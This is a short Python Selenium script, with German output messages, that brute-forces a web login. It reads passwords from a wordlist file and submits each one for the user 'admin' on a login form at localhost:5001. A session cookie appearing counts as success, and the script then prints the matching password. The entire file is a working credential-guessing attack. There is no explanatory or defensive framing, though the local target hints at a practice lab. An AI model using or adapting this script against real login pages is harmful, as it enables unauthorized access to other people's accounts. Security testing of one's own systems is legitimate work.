from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait

driver = webdriver.Chrome()
driver.get("http://localhost:5001/login")
wait = WebDriverWait(driver, 10)
with open("pw.txt", "r") as file:
    passwords = [line.strip() for line in file]

for password in passwords:
    try:

        username_input = driver.find_element(By.ID, "username")
        password_input = driver.find_element(By.ID, "password")
        login_button = driver.find_element(By.CSS_SELECTOR, "form[action='/login'] button[type='submit']")


        username_input.clear()
        password_input.clear()
        username_input.send_keys("admin")
        password_input.send_keys(password)
        login_button.click()

        cookies = driver.get_cookies()
        cookie_names = [c['name'] for c in cookies]

        if "name" in cookie_names:
            print(f"[+] Passwort gefunden: {password}")
            break
        else:
            print(f"[-] Passwort falsch: {password}")

    except Exception as e:
        print(f"[!] Fehler bei Versuch mit '{password}': {e}")

driver.quit()


